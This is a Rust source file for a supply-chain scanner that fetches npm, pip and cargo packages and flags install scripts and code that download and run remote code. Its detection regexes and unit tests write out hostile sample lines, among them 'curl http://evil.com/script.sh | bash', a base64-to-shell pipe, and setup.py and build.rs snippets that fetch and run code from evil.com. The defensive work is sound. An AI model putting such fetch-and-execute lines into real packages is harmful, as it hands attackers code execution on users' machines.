//! Package scanner for npm, pip, and cargo. Fetches packages and scans for malicious
//! patterns before install scripts execute.

use chrono::Utc;
use regex::Regex;
use shared::{ScannerError, Severity, ThreatResult, ThreatType};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;
use std::time::Instant;
use tempfile::TempDir;
use tracing::{debug, info, warn};

#[derive(Clone, Copy)]
pub enum PackageManager {
    Npm,
    Pip,
    Cargo,
}

impl PackageManager {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "npm" => Some(PackageManager::Npm),
            "pip" => Some(PackageManager::Pip),
            "cargo" => Some(PackageManager::Cargo),
            _ => None,
        }
    }
}

pub struct PackageScanner {
    _engine: crate::engine::ScannerEngine,
}

impl PackageScanner {
    pub fn new() -> Self {
        Self {
            _engine: crate::engine::ScannerEngine::new(100),
        }
    }

    pub async fn scan_package(
        &self,
        manager: PackageManager,
        package: &str,
        version: Option<&str>,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let _start = Instant::now();
        info!(
            "Scanning {} package: {} {}",
            match manager {
                PackageManager::Npm => "npm",
                PackageManager::Pip => "pip",
                PackageManager::Cargo => "cargo",
            },
            package,
            version.unwrap_or("latest")
        );

        let package = package.to_string();
        let version = version.map(String::from);
        let manager = manager;
        let threats = tokio::task::spawn_blocking(move || {
            let scanner = PackageScanner::new();
            let temp_dir = TempDir::new()
                .map_err(|e| ScannerError::IoError(format!("Failed to create temp directory: {}", e)))?;
            let threats = match manager {
                PackageManager::Npm => scanner.scan_npm_package(package.as_str(), version.as_deref(), temp_dir.path())?,
                PackageManager::Pip => scanner.scan_pip_package(package.as_str(), version.as_deref(), temp_dir.path())?,
                PackageManager::Cargo => scanner.scan_cargo_package(package.as_str(), version.as_deref(), temp_dir.path())?,
            };
            Ok::<_, ScannerError>(threats)
        })
        .await
        .map_err(|e| ScannerError::IoError(format!("Blocking task failed: {}", e)))??;

        debug!(
            "Package scan completed: {} threats in {}ms",
            threats.len(),
            _start.elapsed().as_millis()
        );
        Ok(threats)
    }

    fn scan_npm_package(
        &self,
        package: &str,
        version: Option<&str>,
        temp_dir: &Path,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let mut threats = Vec::new();

        let package_spec = if let Some(v) = version {
            format!("{}@{}", package, v)
        } else {
            package.to_string()
        };

        info!("Fetching npm package: {}", package_spec);

        let pack_output = Command::new("npm")
            .arg("pack")
            .arg(&package_spec)
            .current_dir(temp_dir)
            .output()
            .map_err(|e| ScannerError::IoError(format!("Failed to run npm pack: {}", e)))?;

        if !pack_output.status.success() {
            return Err(ScannerError::IoError(format!(
                "npm pack failed: {}",
                String::from_utf8_lossy(&pack_output.stderr)
            )));
        }

        let stdout_str = String::from_utf8_lossy(&pack_output.stdout).into_owned();
        let tarball_name = stdout_str
            .trim()
            .lines()
            .next()
            .map(|s| s.to_string())
            .ok_or_else(|| {
                ScannerError::IoError("No tarball name in npm pack output".to_string())
            })?;

        let tarball_path = temp_dir.join(&tarball_name);

        let extract_dir = temp_dir.join("package");
        std::fs::create_dir_all(&extract_dir)
            .map_err(|e| ScannerError::IoError(format!("Failed to create extract dir: {}", e)))?;

        let tar_output = Command::new("tar")
            .arg("-xzf")
            .arg(&tarball_path)
            .arg("-C")
            .arg(&extract_dir)
            .arg("--strip-components")
            .arg("1")
            .output()
            .map_err(|e| ScannerError::IoError(format!("Failed to extract tarball: {}", e)))?;

        if !tar_output.status.success() {
            return Err(ScannerError::IoError(format!(
                "tar extraction failed: {}",
                String::from_utf8_lossy(&tar_output.stderr)
            )));
        }

        let package_json_path = extract_dir.join("package.json");
        if package_json_path.exists() {
            let content = std::fs::read_to_string(&package_json_path)
                .map_err(|e| ScannerError::IoError(format!("Failed to read package.json: {}", e)))?;

            let json: serde_json::Value = serde_json::from_str(&content)
                .map_err(|e| ScannerError::ParseError(format!("Failed to parse package.json: {}", e)))?;

            if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
                for (script_name, script_cmd) in scripts {
                    if let Some(cmd_str) = script_cmd.as_str() {
                        let script_threats =
                            self.scan_npm_script(&package_json_path, script_name, cmd_str);
                        threats.extend(script_threats);
                    }
                }
            }
        }

        self.scan_directory_for_js(&extract_dir, &mut threats)?;

        Ok(threats)
    }

    pub(crate) fn scan_npm_script(
        &self,
        file_path: &Path,
        script_name: &str,
        script_cmd: &str,
    ) -> Vec<ThreatResult> {
        let mut threats = Vec::new();
        let cmd_lower = script_cmd.to_lowercase();

        static CURL_WGET_PIPE: OnceLock<Regex> = OnceLock::new();
        let re = CURL_WGET_PIPE.get_or_init(|| {
            Regex::new(r"(curl|wget)\s+.*\s*\|\s*(sh|bash|zsh|fish|node)").unwrap()
        });
        if re.is_match(&cmd_lower) {
            threats.push(ThreatResult {
                file_path: file_path.to_path_buf(),
                threat_type: ThreatType::MaliciousInstallScript,
                severity: Severity::Critical,
                line_number: None,
                matched_pattern: script_cmd.to_string(),
                pattern_name: "NPM_SCRIPT_DOWNLOAD_EXECUTE".to_string(),
                context: format!(
                    "Script '{}' contains download and execute pattern",
                    script_name
                ),
                remediation: "Review this script carefully. Downloads piped to shell are dangerous.".to_string(),
                timestamp: Utc::now(),
            });
        }

        static BASE64_DECODE: OnceLock<Regex> = OnceLock::new();
        let re = BASE64_DECODE.get_or_init(|| {
            Regex::new(r"base64\s+-d.*\s*\|\s*(sh|bash|zsh|fish|node)").unwrap()
        });
        if re.is_match(&cmd_lower) {
            threats.push(ThreatResult {
                file_path: file_path.to_path_buf(),
                threat_type: ThreatType::ObfuscatedCode,
                severity: Severity::Critical,
                line_number: None,
                matched_pattern: script_cmd.to_string(),
                pattern_name: "NPM_SCRIPT_OBFUSCATED".to_string(),
                context: format!("Script '{}' contains obfuscated code", script_name),
                remediation: "Base64-encoded commands are suspicious. Review carefully.".to_string(),
                timestamp: Utc::now(),
            });
        }

        static NETWORK_EXEC: OnceLock<Regex> = OnceLock::new();
        let re = NETWORK_EXEC.get_or_init(|| {
            Regex::new(r#"(exec|spawn|require\(["']https?://)"#).unwrap()
        });
        if re.is_match(&cmd_lower) {
            threats.push(ThreatResult {
                file_path: file_path.to_path_buf(),
                threat_type: ThreatType::MaliciousInstallScript,
                severity: Severity::High,
                line_number: None,
                matched_pattern: script_cmd.to_string(),
                pattern_name: "NPM_SCRIPT_NETWORK_EXEC".to_string(),
                context: format!("Script '{}' executes code from network", script_name),
                remediation: "Scripts that execute code from network sources are risky.".to_string(),
                timestamp: Utc::now(),
            });
        }

        threats
    }

    fn scan_directory_for_js(
        &self,
        dir: &Path,
        threats: &mut Vec<ThreatResult>,
    ) -> Result<(), ScannerError> {
        self.scan_directory_recursive(dir, threats, &|path| {
            path.extension()
                .and_then(|e| e.to_str())
                .map(|e| e == "js")
                .unwrap_or(false)
        })
    }

    fn scan_directory_recursive(
        &self,
        dir: &Path,
        threats: &mut Vec<ThreatResult>,
        filter: &dyn Fn(&Path) -> bool,
    ) -> Result<(), ScannerError> {
        let entries = std::fs::read_dir(dir)
            .map_err(|e| ScannerError::IoError(format!("Failed to read directory: {}", e)))?;

        for entry in entries {
            let entry =
                entry.map_err(|e| ScannerError::IoError(format!("Failed to read entry: {}", e)))?;
            let path = entry.path();

            if path.is_dir() {
                if path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| n == "node_modules" || n == ".git")
                    .unwrap_or(false)
                {
                    continue;
                }
                self.scan_directory_recursive(&path, threats, filter)?;
            } else if path.is_file() && filter(&path) {
                match self.scan_js_file(&path) {
                    Ok(mut file_threats) => threats.append(&mut file_threats),
                    Err(e) => warn!("Failed to scan {}: {}", path.display(), e),
                }
            }
        }

        Ok(())
    }

    pub(crate) fn scan_js_file(&self, path: &Path) -> Result<Vec<ThreatResult>, ScannerError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| ScannerError::IoError(format!("Failed to read file: {}", e)))?;

        let mut threats = Vec::new();

        static JS_NETWORK_EXEC: OnceLock<Regex> = OnceLock::new();
        let js_network_re = JS_NETWORK_EXEC.get_or_init(|| {
            Regex::new(r"(curl|wget|fetch|axios|request)\(.*\).*\.(then|exec|spawn)").unwrap()
        });
        static JS_OBFUSCATED: OnceLock<Regex> = OnceLock::new();
        let js_obf_re = JS_OBFUSCATED.get_or_init(|| {
            Regex::new(r"(eval|Function\(|atob|Buffer\.from.*toString)").unwrap()
        });

        for (line_num, line) in content.lines().enumerate() {
            let line_lower = line.to_lowercase();

            if js_network_re.is_match(&line_lower) {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::MaliciousInstallScript,
                    severity: Severity::High,
                    line_number: Some(line_num + 1),
                    matched_pattern: line.trim().to_string(),
                    pattern_name: "JS_NETWORK_EXEC".to_string(),
                    context: format!("Line {}: Network request followed by execution", line_num + 1),
                    remediation: "Review this code carefully for malicious network execution.".to_string(),
                    timestamp: Utc::now(),
                });
            }

            if js_obf_re.is_match(&line_lower) && line_lower.contains("http") {
                threats.push(ThreatResult {
                    file_path: path.to_path_buf(),
                    threat_type: ThreatType::ObfuscatedCode,
                    severity: Severity::High,
                    line_number: Some(line_num + 1),
                    matched_pattern: line.trim().to_string(),
                    pattern_name: "JS_OBFUSCATED_NETWORK".to_string(),
                    context: format!(
                        "Line {}: Obfuscated code with network access",
                        line_num + 1
                    ),
                    remediation: "Obfuscated code accessing network is suspicious.".to_string(),
                    timestamp: Utc::now(),
                });
            }
        }

        Ok(threats)
    }

    fn scan_pip_package(
        &self,
        package: &str,
        version: Option<&str>,
        temp_dir: &Path,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let mut threats = Vec::new();

        let package_spec = if let Some(v) = version {
            format!("{}=={}", package, v)
        } else {
            package.to_string()
        };

        info!("Fetching pip package: {}", package_spec);

        let download_output = Command::new("pip")
            .arg("download")
            .arg("--no-deps")
            .arg(&package_spec)
            .arg("--dest")
            .arg(temp_dir)
            .output()
            .map_err(|e| ScannerError::IoError(format!("Failed to run pip download: {}", e)))?;

        if !download_output.status.success() {
            return Err(ScannerError::IoError(format!(
                "pip download failed: {}",
                String::from_utf8_lossy(&download_output.stderr)
            )));
        }

        let entries = std::fs::read_dir(temp_dir)
            .map_err(|e| ScannerError::IoError(format!("Failed to read temp dir: {}", e)))?;

        let mut package_file: Option<PathBuf> = None;
        for entry in entries {
            let entry =
                entry.map_err(|e| ScannerError::IoError(format!("Failed to read entry: {}", e)))?;
            let path = entry.path();
            if path.is_file() {
                let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                if ext == "whl" || ext == "tar.gz" || ext == "zip" {
                    package_file = Some(path);
                    break;
                }
            }
        }

        let package_file = package_file.ok_or_else(|| {
            ScannerError::IoError("No package file found after pip download".to_string())
        })?;

        let extract_dir = temp_dir.join("package");
        std::fs::create_dir_all(&extract_dir)
            .map_err(|e| ScannerError::IoError(format!("Failed to create extract dir: {}", e)))?;

        if package_file.extension().and_then(|e| e.to_str()) == Some("whl") {
            let unzip_output = Command::new("unzip")
                .arg("-q")
                .arg(&package_file)
                .arg("-d")
                .arg(&extract_dir)
                .output()
                .map_err(|e| ScannerError::IoError(format!("Failed to unzip wheel: {}", e)))?;

            if !unzip_output.status.success() {
                return Err(ScannerError::IoError(format!(
                    "unzip failed: {}",
                    String::from_utf8_lossy(&unzip_output.stderr)
                )));
            }
        } else {
            let tar_output = Command::new("tar")
                .arg("-xzf")
                .arg(&package_file)
                .arg("-C")
                .arg(&extract_dir)
                .output()
                .map_err(|e| ScannerError::IoError(format!("Failed to extract tarball: {}", e)))?;

            if !tar_output.status.success() {
                return Err(ScannerError::IoError(format!(
                    "tar extraction failed: {}",
                    String::from_utf8_lossy(&tar_output.stderr)
                )));
            }
        }

        let setup_py_path = extract_dir.join("setup.py");
        if setup_py_path.exists() {
            threats.extend(self.scan_setup_py(&setup_py_path)?);
        }

        let pyproject_path = extract_dir.join("pyproject.toml");
        if pyproject_path.exists() {
            threats.extend(self.scan_pyproject_toml(&pyproject_path)?);
        }

        self.scan_directory_for_python(&extract_dir, &mut threats)?;

        Ok(threats)
    }

    pub(crate) fn scan_setup_py(
        &self,
        path: &Path,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| ScannerError::IoError(format!("Failed to read setup.py: {}", e)))?;

        let mut threats = Vec::new();
        let content_lower = content.to_lowercase();

        static SETUP_PY_NETWORK: OnceLock<Regex> = OnceLock::new();
        let re = SETUP_PY_NETWORK.get_or_init(|| {
            Regex::new(r"(subprocess|os\.system|exec|eval).*http").unwrap()
        });

        if re.is_match(&content_lower) {
            threats.push(ThreatResult {
                file_path: path.to_path_buf(),
                threat_type: ThreatType::MaliciousInstallScript,
                severity: Severity::Critical,
                line_number: None,
                matched_pattern: "Network execution in setup.py".to_string(),
                pattern_name: "SETUP_PY_NETWORK_EXEC".to_string(),
                context: "setup.py executes code from network".to_string(),
                remediation: "Review setup.py for malicious network execution.".to_string(),
                timestamp: Utc::now(),
            });
        }

        Ok(threats)
    }

    fn scan_pyproject_toml(
        &self,
        path: &Path,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| ScannerError::IoError(format!("Failed to read pyproject.toml: {}", e)))?;

        let mut threats = Vec::new();

        let toml: toml::Value = toml::from_str(&content)
            .map_err(|e| ScannerError::ParseError(format!("Failed to parse pyproject.toml: {}", e)))?;

        if let Some(build_system) = toml.get("build-system") {
            if let Some(requires) = build_system.get("requires").and_then(|r| r.as_array()) {
                for req in requires {
                    if let Some(req_str) = req.as_str() {
                        if req_str.contains("http://") || req_str.contains("https://") {
                            threats.push(ThreatResult {
                                file_path: path.to_path_buf(),
                                threat_type: ThreatType::MaliciousInstallScript,
                                severity: Severity::High,
                                line_number: None,
                                matched_pattern: req_str.to_string(),
                                pattern_name: "PYPROJECT_NETWORK_DEP".to_string(),
                                context: "pyproject.toml requires dependency from network".to_string(),
                                remediation: "Review build dependencies carefully.".to_string(),
                                timestamp: Utc::now(),
                            });
                        }
                    }
                }
            }
        }

        Ok(threats)
    }

    fn scan_directory_for_python(
        &self,
        dir: &Path,
        threats: &mut Vec<ThreatResult>,
    ) -> Result<(), ScannerError> {
        self.scan_directory_recursive(dir, threats, &|path| {
            path.file_name()
                .and_then(|n| n.to_str())
                .map(|n| n == "__init__.py" || n.ends_with(".py"))
                .unwrap_or(false)
        })
    }

    fn scan_cargo_package(
        &self,
        package: &str,
        version: Option<&str>,
        temp_dir: &Path,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let mut threats = Vec::new();

        let package_spec = if let Some(v) = version {
            format!("{} = \"{}\"", package, v)
        } else {
            format!("{} = \"*\"", package)
        };

        let cargo_toml_path = temp_dir.join("Cargo.toml");
        let cargo_toml_content = format!(
            "[package]\nname = \"temp-scanner\"\nversion = \"0.1.0\"\n\n[dependencies]\n{}\n",
            package_spec
        );

        std::fs::write(&cargo_toml_path, cargo_toml_content)
            .map_err(|e| ScannerError::IoError(format!("Failed to write Cargo.toml: {}", e)))?;

        let fetch_output = Command::new("cargo")
            .arg("fetch")
            .arg("--manifest-path")
            .arg(&cargo_toml_path)
            .output()
            .map_err(|e| ScannerError::IoError(format!("Failed to run cargo fetch: {}", e)))?;

        if !fetch_output.status.success() {
            return Err(ScannerError::IoError(format!(
                "cargo fetch failed: {}",
                String::from_utf8_lossy(&fetch_output.stderr)
            )));
        }

        // For cargo we primarily rely on the registry cache; build.rs scanning would require
        // locating the package in ~/.cargo/registry. We scan build.rs if present in temp_dir.
        let build_rs_path = temp_dir.join("build.rs");
        if build_rs_path.exists() {
            threats.extend(self.scan_build_rs(&build_rs_path)?);
        }

        Ok(threats)
    }

    pub(crate) fn scan_build_rs(
        &self,
        path: &Path,
    ) -> Result<Vec<ThreatResult>, ScannerError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| ScannerError::IoError(format!("Failed to read build.rs: {}", e)))?;

        let mut threats = Vec::new();

        static BUILD_RS_NETWORK: OnceLock<Regex> = OnceLock::new();
        let re = BUILD_RS_NETWORK.get_or_init(|| {
            Regex::new(r"Command::new\(.*(curl|wget|http|https)").unwrap()
        });
        if re.is_match(&content) {
            threats.push(ThreatResult {
                file_path: path.to_path_buf(),
                threat_type: ThreatType::MaliciousInstallScript,
                severity: Severity::High,
                line_number: None,
                matched_pattern: "Network command in build.rs".to_string(),
                pattern_name: "BUILD_RS_NETWORK".to_string(),
                context: "build.rs executes network commands".to_string(),
                remediation: "Review build.rs for malicious network execution.".to_string(),
                timestamp: Utc::now(),
            });
        }

        static BUILD_RS_WRITE: OnceLock<Regex> = OnceLock::new();
        let re = BUILD_RS_WRITE.get_or_init(|| {
            Regex::new(r"std::fs::write\(.*(/tmp|/var/tmp|/dev)").unwrap()
        });
        if re.is_match(&content) {
            threats.push(ThreatResult {
                file_path: path.to_path_buf(),
                threat_type: ThreatType::MaliciousInstallScript,
                severity: Severity::High,
                line_number: None,
                matched_pattern: "Suspicious file write in build.rs".to_string(),
                pattern_name: "BUILD_RS_SUSPICIOUS_WRITE".to_string(),
                context: "build.rs writes to suspicious paths".to_string(),
                remediation: "Review build.rs file writes carefully.".to_string(),
                timestamp: Utc::now(),
            });
        }

        Ok(threats)
    }
}

impl Default for PackageScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use shared::Severity;

    #[test]
    fn test_npm_malicious_postinstall() {
        let scanner = PackageScanner::new();

        let threats = scanner.scan_npm_script(
            &std::path::PathBuf::from("/tmp/test/package.json"),
            "postinstall",
            "curl http://evil.com/script.sh | bash",
        );

        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "NPM_SCRIPT_DOWNLOAD_EXECUTE");
        assert_eq!(threats[0].severity, Severity::Critical);
    }

    #[test]
    fn test_npm_base64_obfuscation() {
        let scanner = PackageScanner::new();

        let threats = scanner.scan_npm_script(
            &std::path::PathBuf::from("/tmp/test/package.json"),
            "postinstall",
            "echo 'd2hvYW1p' | base64 -d | sh",
        );

        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "NPM_SCRIPT_OBFUSCATED");
    }

    #[test]
    fn test_js_network_exec() {
        let scanner = PackageScanner::new();

        let js_content = r#"
        const https = require('https');
        https.get('http://evil.com/script.js', (res) => {
            eval(res.body);
        });
        "#;

        let temp_file = std::path::PathBuf::from("/tmp/test_script_pkg.js");
        std::fs::write(&temp_file, js_content).unwrap();

        let threats = scanner.scan_js_file(&temp_file).unwrap();

        assert!(!threats.is_empty());

        std::fs::remove_file(&temp_file).ok();
    }

    #[test]
    fn test_pip_setup_py_network() {
        let scanner = PackageScanner::new();

        let setup_py_content = r#"
        import subprocess
        import urllib.request
        subprocess.call(['bash', '-c', urllib.request.urlopen('http://evil.com/script.sh').read()])
        "#;

        let temp_file = std::path::PathBuf::from("/tmp/test_setup_pkg.py");
        std::fs::write(&temp_file, setup_py_content).unwrap();

        let threats = scanner.scan_setup_py(&temp_file).unwrap();

        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "SETUP_PY_NETWORK_EXEC");

        std::fs::remove_file(&temp_file).ok();
    }

    #[test]
    fn test_cargo_build_rs_network() {
        let scanner = PackageScanner::new();

        let build_rs_content = r#"
        use std::process::Command;
        Command::new("curl").arg("http://evil.com/script.sh").spawn();
        "#;

        let temp_file = std::path::PathBuf::from("/tmp/test_build_pkg.rs");
        std::fs::write(&temp_file, build_rs_content).unwrap();

        let threats = scanner.scan_build_rs(&temp_file).unwrap();

        assert!(!threats.is_empty());
        assert_eq!(threats[0].pattern_name, "BUILD_RS_NETWORK");

        std::fs::remove_file(&temp_file).ok();
    }
}
